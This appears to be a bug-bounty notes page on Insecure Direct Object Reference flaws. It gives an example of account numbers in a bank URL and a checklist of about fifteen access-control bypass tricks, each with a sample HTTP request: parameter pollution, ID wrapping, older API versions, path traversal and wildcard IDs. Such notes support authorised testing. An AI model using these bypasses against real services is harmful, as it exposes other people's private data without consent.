# Insecure Direct Object Reference

## IDOR Checklist

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## Basics

[https://owasp.org/www-project-top-ten/2017/A5\_2017-Broken\_Access\_Control.html](https://owasp.org/www-project-top-ten/2017/A5\_2017-Broken\_Access\_Control.html)\
\
For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this [https://example.com/bank?account\_number=1234](https://example.com/bank?account\_number=1234). On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.\
There is however a potentially huge problem here, a hacker may be able to change the account\_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.

### **How to Find**

1. Add parameters onto the endpoints for example, if there was

```
GET /api/v1/getuser
[...]
```

Try this to bypass

```
GET /api/v1/getuser?id=1234
[...]
```

1. HTTP Parameter pollution

```
POST /api/get_profile
[...]
user_id=hacker_id&user_id=victim_id
```

1. Add .json to the endpoint

```
GET /v2/GetData/1234
[...]
```

Try this to bypass

```
GET /v2/GetData/1234.json
[...]
```

1. Test on outdated API Versions

```
POST /v2/GetData
[...]
id=123
```

Try this to bypass

```
POST /v1/GetData
[...]
id=123
```

1. Wrap the ID with an array.

```
POST /api/get_profile
[...]
{"user_id":111}
```

Try this to bypass

```
POST /api/get_profile
[...]
{"id":[111]}
```

1. Wrap the ID with a JSON object

```
POST /api/get_profile
[...]
{"user_id":111}
```

Try this to bypass

```
POST /api/get_profile
[...]
{"user_id":{"user_id":111}}
```

1. JSON Parameter Pollution

```
POST /api/get_profile
[...]
{"user_id":"hacker_id","user_id":"victim_id"}
```

1. Try decode the ID, if the ID encoded using md5,base64,etc

```
GET /GetUser/dmljdGltQG1haWwuY29t
[...]
```

dmljdGltQG1haWwuY29t => [victim@mail.com](mailto:victim@mail.com)

1. If the website using graphql, try to find IDOR using graphql!

```
GET /graphql
[...]
```

```
GET /graphql.php?query=
[...]
```

1. MFLAC (Missing Function Level Access Control)

```
GET /admin/profile
```

Try this to bypass

```
GET /ADMIN/profile
```

1. Try to swap uuid with number

```
GET /file?id=90ri2-xozifke-29ikedaw0d
```

Try this to bypass

```
GET /file?id=302
```

1. Change HTTP Method

```
GET /api/v1/users/profile/111
```

Try this to bypass

```
POST /api/v1/users/profile/111
```

1. Path traversal

```
GET /api/v1/users/profile/victim_id
```

Try this to bypass

```
GET /api/v1/users/profile/my_id/../victim_id
```

1. Change request content type

```
Content-type: application/xml
```

Try this to bypass

```
Content-type: application/json
```

1. Send wildcard instead of ID

```
GET /api/users/111
```

Try this to bypass

```
GET /api/users/*
```

1. Try google dorking to find new endpoint

Reference:

* [@swaysThinking](https://twitter.com/swaysThinking) and other medium writeup
* [https://github.com/daffainfo/AllAboutBugBounty/blob/master/Insecure%20Direct%20Object%20References.md](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Insecure%20Direct%20Object%20References.md)
